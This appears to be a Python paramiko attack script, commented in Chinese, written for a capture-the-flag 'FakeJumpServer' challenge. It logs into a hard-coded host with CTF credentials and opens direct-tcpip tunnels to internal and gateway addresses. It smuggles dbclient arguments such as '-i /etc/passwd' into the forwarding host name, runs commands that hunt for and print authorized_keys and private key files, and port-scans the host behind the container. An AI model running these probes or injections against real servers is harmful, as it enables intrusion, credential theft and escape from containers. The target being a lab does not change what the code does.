import paramiko
import socket
import time
import sys

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def check_hostkey_forwarding():
    """
    关键测试：检查通过SSH隧道连接时的host key
    
    当我们通过跳板机连接到目标时，跳板机可能会：
    1. 直接转发TCP流量（正确行为）
    2. 作为MITM修改流量
    
    如果是后者，我们可以利用这个来泄露信息
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 连接到不同的目标，比较host key
    targets = [
        ("localhost", 22, "dropbear内部"),
        ("127.0.0.1", 22, "dropbear内部"),
        ("10.0.2.2", 22, "QEMU网关"),
        ("10.0.2.15", 22, "QEMU host"),
        ("172.17.0.1", 22, "宿主机"),
    ]
    
    host_keys = {}
    
    for host, port, desc in targets:
        try:
            print(f"\n[*] 连接到 {host}:{port} ({desc})...")
            channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
            
            # 读取SSH banner
            channel.settimeout(3)
            banner = channel.recv(1024)
            print(f"    Banner: {banner[:60]}")
            
            # 我们可以手动进行SSH握手来获取host key
            # 但更简单的方法是通过paramiko
            channel.close()
            
            # 创建新通道并通过paramiko连接
            channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
            
            target_transport = paramiko.Transport(channel)
            target_transport.start_client()
            
            key = target_transport.get_remote_server_key()
            key_fp = key.get_fingerprint().hex()
            
            print(f"    Host key fingerprint: {key_fp}")
            print(f"    Key type: {key.get_name()}")
            
            host_keys[host] = key_fp
            
            target_transport.close()
            
        except Exception as e:
            print(f"    错误: {e}")
    
    # 比较host keys
    print("\n[*] Host key比较:")
    unique_keys = set(host_keys.values())
    print(f"    找到 {len(unique_keys)} 个不同的host key")
    
    for host, fp in host_keys.items():
        print(f"    {host}: {fp}")
    
    ssh.close()

def test_fake_host():
    """
    FakeJumpServer的另一个攻击向量：
    如果跳板机在处理ProxyJump时会启动SSH客户端，
    我们可能可以通过控制目标地址来注入命令
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 如果dropbear使用dbclient来处理ProxyJump，
    # 它可能会执行类似 "dbclient -W host:port" 的命令
    # 我们可以尝试注入参数
    
    test_hosts = [
        # 参数注入
        "-p 22 localhost",
        "localhost -p 22",
        # 文件读取（如果dbclient支持）
        "-i /etc/passwd localhost",
        # 命令执行
        "-J localhost:22 localhost",
    ]
    
    for host in test_hosts:
        try:
            print(f"\n[*] 测试: {repr(host)}")
            channel = transport.open_channel("direct-tcpip", (host, 22), ('127.0.0.1', 0), timeout=3)
            print(f"[+] 通道打开成功")
            channel.settimeout(2)
            data = channel.recv(256)
            print(f"    数据: {data}")
            channel.close()
        except Exception as e:
            error = str(e)
            if "timed out" not in error.lower():
                print(f"[-] 错误: {error}")
    
    ssh.close()

def check_inner_dropbear():
    """检查内部的dropbear配置和行为"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查内部dropbear...")
    
    # 检查dropbear进程
    # 由于我们在容器内，dropbear应该在容器外运行
    # 但我们可以检查一些配置
    
    # 检查是否有authorized_keys
    print("\n[*] 检查authorized_keys...")
    print(exec_cmd(ssh, "find / -name authorized_keys"))
    print(exec_cmd(ssh, "cat /root/.ssh/authorized_keys"))
    
    # 检查是否有私钥
    print("\n[*] 检查私钥...")
    print(exec_cmd(ssh, "find / -name 'id_*' -o -name '*_key'"))
    
    # 检查mount信息，看看是否有宿主机的文件被挂载
    print("\n[*] 检查mount...")
    print(exec_cmd(ssh, "mount"))
    
    # 检查是否能访问宿主机的文件系统
    print("\n[*] 检查/run/host...")
    print(exec_cmd(ssh, "ls -laR /run/host/"))
    
    ssh.close()

def try_connect_to_host_with_key():
    """尝试使用密钥连接到宿主机"""
    
    # 首先从容器内获取可能的密钥
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 生成一个密钥对
    print("[*] 在容器内生成密钥...")
    print(exec_cmd(ssh, "mkdir -p /root/.ssh"))
    
    # 使用busybox的工具无法生成ssh密钥，但我们可以检查是否有现成的
    
    # 查看容器UUID - 可能有助于理解架构
    print("\n[*] 容器信息:")
    print(exec_cmd(ssh, "cat /run/host/container-uuid"))
    print(exec_cmd(ssh, "cat /run/host/container-manager"))
    
    ssh.close()

def test_stdio_forward():
    """
    测试SSH stdio转发
    这是FakeJumpServer攻击的核心
    """
    
    # 当使用 ssh -W host:port 时，SSH会将stdin/stdout转发到目标
    # 如果跳板机以特殊方式处理这个，可能会泄露信息
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 打开一个exec通道，尝试运行 "ssh -W host:port" 风格的命令
    # 但由于容器内没有ssh命令，这可能不会直接工作
    
    # 不过我们可以通过direct-tcpip来模拟
    # 关键是观察dropbear如何处理转发请求
    
    # 尝试转发到一个特殊端口
    print("[*] 测试转发到不同端口...")
    
    # 检查宿主机上是否有其他端口开放
    for port in [22, 80, 443, 2222, 8080, 9000]:
        try:
            channel = transport.open_channel("direct-tcpip", ("172.17.0.1", port), ('127.0.0.1', 0), timeout=2)
            print(f"[+] 172.17.0.1:{port} 开放")
            channel.settimeout(1)
            try:
                data = channel.recv(100)
                print(f"    Banner: {data[:50]}")
            except:
                pass
            channel.close()
        except:
            pass
    
    ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] Host Key和转发测试")
    print("="*50)
    
    print("\n[1] 检查内部dropbear")
    check_inner_dropbear()
    
    print("\n[2] 容器信息")
    try_connect_to_host_with_key()
    
    print("\n[3] 测试stdio转发")
    test_stdio_forward()
    
    print("\n[4] 检查host key转发")
    check_hostkey_forwarding()
